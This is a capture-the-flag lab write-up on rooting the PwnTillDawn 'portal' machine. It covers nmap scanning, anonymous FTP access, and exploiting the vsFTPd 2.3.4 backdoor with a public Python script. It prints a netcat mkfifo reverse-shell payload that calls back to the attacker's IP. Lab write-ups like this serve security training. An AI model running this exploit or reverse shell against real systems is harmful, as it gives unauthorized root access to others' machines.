<h2>Recon</h2>

<h3>PortScanning</h3>

>command: sudo nmap -A 10.150.150.12 -T4 -p- -v

```
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 14:03 WAT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
Initiating Ping Scan at 14:03
Scanning 10.150.150.12 [2 ports]
Completed Ping Scan at 14:03, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:03
Completed Parallel DNS resolution of 1 host. at 14:03, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:03
Scanning 10.150.150.12 [2 ports]
Discovered open port 22/tcp on 10.150.150.12
Discovered open port 21/tcp on 10.150.150.12
Completed Connect Scan at 14:03, 0.21s elapsed (2 total ports)
Initiating Service scan at 14:03
Scanning 2 services on 10.150.150.12
Completed Service scan at 14:03, 11.65s elapsed (2 services on 1 host)
NSE: Script scanning 10.150.150.12.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:03
NSE: [ftp-bounce 10.150.150.12:21] PORT response: 500 Illegal PORT command.
Completed NSE at 14:03, 5.68s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 1.62s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
Nmap scan report for 10.150.150.12
Host is up, received conn-refused (0.19s latency).
Scanned at 2023-03-05 14:03:06 WAT for 20s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.66.67.154
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1fbce3e35bebffb230a74c3311bf67a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNJLKYeEYcwlcZwNBGcgq5BlP2wkA9AOzQGjGuwBZ5gK49AC4sDQxaibRi/pD2bFJyDChiDbhORiCts3hCzqSba2FIW/gssX3/Wf8SapfBXofKgbyt3Pzdv3NiyguRVqsPyWCkY24+mSrJxX6ihLi/8g9VRV9x5z6pEj/QK2g0dcG6f+KDLjsCplG7sLJTfaDbEM0xnIKkMS4CoOE29E8PFKYXLFFFEH69Q00veXVJPslIpKJLaPz1HnPb6qc98zYVLO4yXKDAp1A+SWWYa+VpP3o0dlf+jqy9xfMbI5AkhpAkPnWKhnRPQePjO3BtqWrh3cciwwwZkAp01AjBQNQ+Z331bzdR9m84lmXdqYuViSuOf9cl1N2wggI/uEcTxDC80P3xBA33oUoM6g+LThHdJNWRRKYaFFTFwcf6RC50QhU/8sXUEC9dDJAqLfwlrFnFgq+yQeRTSun9F+fLjHLCrctpkRppQ2MZe9RbTGBmNFiQUv2duW2GLf2mM+SSEns=
|   256 c8e4182959d04eeadc0550bcd56fe500 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGWJ0C2vIVhBdw1BhjTFtJrqBTvA3i4HXc9OLs/m4ZdhZqYJoOewLPrslES8SNIeeRgkdLI99Vu67rlaK6LBglo=
|   256 58d5706d0d80710aba8e1c7ac7372fe2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/Bufv9IhkPSqGRANzYgQUl+VjXNbJAV8j+66MKZXq+
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.87 seconds
```
We have 2 ports opened, port 21 which runs ftp and port 22 which runs ssh. Our enumeration will be focused on port 21.



<h2>Enumeration</h2>

Since Anonymous login is allowed, we can log in using the creds

```username:anonymous```        ```password:anonymous```

>command:ftp 10.150.150.12

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/portal]
└─$ ftp 10.150.150.12 
Connected to 10.150.150.12.
220 Through the portal... - into nothingness or bliss?
Name (10.150.150.12:bl4ck4non): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||9685|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 10  2020 .
drwxr-xr-x    2 0        0            4096 Nov 10  2020 ..
226 Directory send OK.
ftp> 
```
oops, there's not file available in this ftp server. Going back to our nmap scan

![image](https://user-images.githubusercontent.com/67879936/222962577-a611c111-4687-443e-a3c1-29bb9042dc3e.png)

Lets use nmap scripting engine to get the exact version of vsFTPD.

>command:nmap --script ftp-vsftpd-backdoor -p 21 10.150.150.12

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/portal]
└─$ nmap --script ftp-vsftpd-backdoor -p 21 10.150.150.12
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-05 14:19 WAT
Nmap scan report for 10.150.150.12
Host is up (0.22s latency).

PORT   STATE SERVICE
21/tcp open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  BID:48539  CVE:CVE-2011-2523
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root) groups=0(root)
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       https://www.securityfocus.com/bid/48539
|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|_      http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html

Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds
```
cool, we found the exact version ```vsFTPd version 2.3.4```, and the scan tells us it's vulnerable. So, lets look for an exploit

![image](https://user-images.githubusercontent.com/67879936/222963272-7f19f28e-f29d-44f6-aac0-d857bda8e828.png)

Lets exploit this vulnerability




<h2>Exploitation</h2>

Link to Exploit:https://github.com/ahervias77/vsftpd-2.3.4-exploit.git

Download this exploit to your machine and try to run it

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/portal]
└─$ git clone https://github.com/ahervias77/vsftpd-2.3.4-exploit.git                               
Cloning into 'vsftpd-2.3.4-exploit'...
remote: Enumerating objects: 9, done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 9
Receiving objects: 100% (9/9), done.
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/portal]
└─$ cd vsftpd-2.3.4-exploit 
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/portal/vsftpd-2.3.4-exploit]
└─$ ls 
README.md  vsftpd_234_exploit.py
                                                                                                                                                                        
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/portal/vsftpd-2.3.4-exploit]
└─$ python vsftpd_234_exploit.py 
Usage: ./vsftpd_234_exploit.py <IP address> <port> <command>
Example: ./vsftpd_234_exploit.py 192.168.1.10 21 whoami
```
To make this exploit work we need to input those parameters

```
┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/PwnTillDawn/portal/vsftpd-2.3.4-exploit]
└─$ python vsftpd_234_exploit.py 10.150.150.12 21 whoami
[*] Attempting to trigger backdoor...
[+] Triggered backdoor
[*] Attempting to connect to backdoor...
[+] Connected to backdoor on 10.150.150.12:6200
[+] Response:
root
```
Our command got executed successfully. Now, lets try to generate a reverse shell so when we execute it we can get a shell back on our netcat listener

payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.66.67.154 1234 >/tmp/f```

Ensure you set your netcat listener before running the command

>rlwrap nc -nvlp 1234

![image](https://user-images.githubusercontent.com/67879936/222964135-32e48e17-d770-4232-9b48-35ca23ec29a8.png)

Boom!!! We got a shell as ```root``` user. Also, we found the flag in the ```/root``` directory.


That will be all for today
<br> <br>
[Back To Home](../../index.md)

















